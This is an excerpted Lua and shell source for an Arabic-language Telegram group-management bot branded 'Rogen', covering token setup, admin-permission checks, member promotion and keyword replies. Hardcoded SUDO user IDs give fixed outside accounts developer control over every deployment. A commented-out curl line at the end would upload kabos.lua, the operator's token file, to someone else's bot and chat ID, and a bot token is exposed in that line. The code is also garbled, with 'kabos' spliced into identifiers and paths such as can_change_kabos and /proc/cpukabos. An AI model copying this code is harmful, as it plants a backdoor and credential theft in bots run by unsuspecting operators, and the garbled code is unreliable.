...
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "kabos"})  
else  
...
if res ~= 200 then
print('\27[0;31m┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
if [ ! $token ]; then
echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝑹𝑶┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝑹𝑶┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE kabos.LUA \e[0m"
echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝑹𝑶┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./kabos.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
SUDO_users = {SUDO,1829540452,1654178416,SUDO}   
...
if tonumber(user_id) == tonumber(1829540452) then  
var = true  
...
function s_api(web) 
local kabos, res = https.request(web) local req = json:decode(kabos) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
...
function Get_kabos(msg,chat,user) 
local Chek_kabos = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_kabos = JSON.decode(Chek_kabos)
if Json_kabos.ok == true then
if Json_kabos.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n🪐 مالك الجروب')   
return false  end 
if Json_kabos.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n🪐 مجرد عضو هنا ')   
return false  end
if Json_kabos.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n🪐 الشخص غير موجود هنا ')   
return false  end
if Json_kabos.result.status == "administrator" then
if Json_kabos.result.can_change_kabos == true then
kabos = '✔️'
else
kabos = '✖'
end
if Json_kabos.result.can_delete_messages == true then
delete = '✔️'
else
delete = '✖'
end
if Json_kabos.result.can_invite_users == true then
invite = '✔️'
else
invite = '✖'
end
if Json_kabos.result.can_pin_messages == true then
pin = '✔️'
else
pin = '✖'
end
if Json_kabos.result.can_restrict_members == true then
restrict = '✔️'
else
restrict = '✖'
end
if Json_kabos.result.can_promote_members == true then
promote = '✔️'
else
promote = '✖'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ↓ \nٴ━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..kabos..' ❵'..'\n- حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
local kabos_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(kabos_file)
...
if result.forward_kabos_.sender_user_id_ then     
id_user = result.forward_kabos_.sender_user_id_    
end     
...
echo '*—————⌯𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗⌯——————~*\n🪐✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
echo '*—————𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘??𝚎𝚗——————~*\n🪐✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
echo '*—————⌯𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗⌯——————~*\n🪐✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpukabos`""Core ~ {$CPUPer%} "'*'
echo '*—————⌯𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗⌯——————~*\n🪐✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/SO_ROGEN"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SO_ROGEN)
]] 
...
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatkabos") then
...
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatkabos' then
...
--------------------------------------------------------------------------------------------------------------
if msg.forward_kabos_ and not Special(msg) then     
...
[ ╭──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
 ...
 ☆𝚠𝚎𝚕𝚌𝚘𝚖 𝚝𝚘 𝚜𝚘𝚞𝚛𝚎𝚌𝚎☆
  ...
  ╰──── 𝚛𝚘𝚘𝚐𝚎𝚗 ────╯ ](t.me/SO_ROGEN)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 𝚊𝚕𝚖𝚊𝚐𝚔 , url="t.me/M_A_G_K"}},
{{text = 𝙼𝚊𝚛𝚝𝚎𝚗 ,url="t.me/I_C_X"}}, 
{{text = 𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜 ,url="t.me/G_W_P"}}, 
...
🪐اهلا بك في سورس روجين لو عايز بوت بأسعار منسبه وبوت مميز كلمني 🪐
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚎𝚕𝚔𝚊𝚋𝚘𝚘𝚜',url="t.me/G_W_P"}},
...
if text == "كتبات" or text == "بوستات" or text == "قصيده" then 
local TWEET_Msg = { 
...
if result.sender_user_id_ == tonumber(1744196893) then
...
if res == 200 then
local Get_kabos, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_kabos then
local TextS = "\n 🪐 اهلا بك في متجر ملفات روجين \n 🪐 ملفات السورس ↓\n┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄\n\n"
local TextE = "\n┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄\n 🪐 علامة تعني { ✔️ } ملف مفعل\n 🪐 علامة تعني { ✖ } ملف معطل\n 🪐 قناة سورس روجين ↓\n".." 🪐 [اضغط هنا لدخول](t.me/SO_ROGEN) \n"
local NumFile = 0
for name,kabos in pairs(res.plugins_) do
...
st = https.request('https://black-source.tk/BlackTeAM/Imagekabos.php?token='..tonumber(00000000)..'&url='..tonumber(00000000).."&type=sticker")
eker = JSON.decode(st)
if eker.ok.kabos == "Indecent" then
...
Srrt = https.request('https://black-source.tk/BlackTeAM/Imagekabos.php?token='..tonumber(00000000)..'&url='..tonumber(00000000).."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.kabos == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "🪐 المنشئين الاساسين تعالو مخرب \n┄─━━𝚛𝚘𝚘𝚐𝚎𝚗━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
...
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_kabos_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_kabos=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_kabos=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, ' 🪐  لا يوجد حساب بهاذا المعرف')
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_kabos=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_kabos=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_kabos=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_kabos=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, ' 🪐  لا يوجد حساب بهاذا المعرف')
end
end
...
kabos = ' 🪐 المعرف غلط'
send(msg.chat_id_, msg.id_,kabos)
end
end
...
local getkabos = JSON.decode(chek)
if getkabos.result.can_promote_members == false then
...
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getkabos = JSON.decode(chek)
if getkabos.ok == true then
if getkabos.result.can_change_kabos == true then
INf = '❴ ✔️ ❵' 
else 
INf = '❴ ✖ ❵' 
end
if getkabos.result.can_delete_messages == true then
DEL = '❴ ✔️ ❵' 
else 
DEL = '❴ ✖ ❵' 
end
if getkabos.result.can_invite_users == true then
INv = '❴ ✔️ ❵' 
else
INv = '❴ ✖ ❵' 
end
if getkabos.result.can_pin_messages == true then
Pin = '❴ ✔️ ❵' 
else
Pin = '❴ ✖ ❵' 
end
if getkabos.result.can_restrict_members == true then
REs = '❴ ✔️ ❵' 
else 
REs = '❴ ✖ ❵' 
end
if getkabos.result.can_promote_members == true then
PRo = '❴ ✔️ ❵'
else
PRo = '❴ ✖ ❵'
end 
...
if muaed.kabos == true then
local filee = download_to_file(muaed.ph,msg.sender_user_id_..'.jpg')
sendPhoto(msg.chat_id_, msg.id_,'./'..msg.sender_user_id_..'.jpg',muaed.kabos)     
...
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/SO_ROGEN)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/SO_ROGEN)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمن بحبك يواد 🥺💗](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عب يوصخ 🙂😹](t.me/SO_ROGEN)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[قول قول ولمصحف بحب الفضيح..🙂😹](t.me/SO_ROGEN)')
return false
end
end
end
...
if text and text:match("^(gpkabos)$") or text and text:match("^معلومات الجروب$") then
function gpkabos(arg,data)
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, ' 🪐 ايدي المجموعة » ( '..msg.chat_id_..' )\n 🪐 عدد الادمنيه » ( *'..data.administrator_count_..' )*\n 🪐 عدد المحظورين » ( *'..data.kicked_count_..' )*\n 🪐 عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpkabos, nil) 
end
-----------
...
local Chek_kabos = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_kabos = JSON.decode(Chek_kabos)
if Json_kabos.ok == true then
if Json_kabos.result.status == "administrator" then
if Json_kabos.result.can_change_kabos == true then
kabos = '✔️' else kabos = '✖' end
if Json_kabos.result.can_delete_messages == true then
...
local Text =[[
         اتبع الازرار تحت ب اوامر سورس روجين   ⬇️
...
if getmo.kabos == true then
local Text ='قصه الفلم'..getmo.kabos
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == 'بوت حذف' or text == 'بوت الحذف' or text == 'رابط حذف' then
local Text = [[
⌯𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗⌯
بوت حذف حساب 🪐
مع السلامه يبوحه هتوحشني اوي يست🙂😹
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
Get_kabos(msg,msg.chat_id_,result.sender_user_id_)
end  
...
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_kabos(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
------------------------------------------------------------------------
...
Get_kabos(msg,msg.chat_id_,result.id_)
end  
...
local Json_kabos = JSON.decode(DRAGON)
if Json_kabos.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
...
--local curl = 'curl "'..'https://api.telegram.org/bot1878601191:AAHUc4_uIQ44E4sTbm0FyRbqdXyhRFjiwHw/sendDocument'..'" -F "chat_id='.. 1208165035 ..'" -F "document=@'..'kabos.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
